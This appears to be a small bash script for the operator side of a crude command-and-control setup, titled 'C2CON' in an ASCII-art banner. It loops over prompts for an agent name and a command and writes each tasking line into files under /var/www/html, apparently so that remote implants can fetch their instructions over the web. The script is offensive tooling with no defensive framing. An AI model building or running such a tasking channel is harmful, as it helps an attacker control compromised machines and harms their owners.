echo """
  ______ ___     ______   ______   .__   __. 
 /      |__ \   /      | /  __  \  |  \ |  | 
|  ,----'  ) | |  ,----'|  |  |  | |   \|  | 
|  |      / /  |  |     |  |  |  | |  . \`  | 
|  \`----./ /_  |  \`----.|  \`--'  | |  |\   | 
 \______|____|  \______| \______/  |__| \__| 
 
                 Started from the bottom, we keep dingin
"""
while true
do
echo "Agent"
read agent
echo "Ze Juice"
read cmd
echo "$agent:$cmd" >> /var/www/html/cmds.txt
echo "Task to $agent => $cmd" >> /var/www/html/res.txt
done
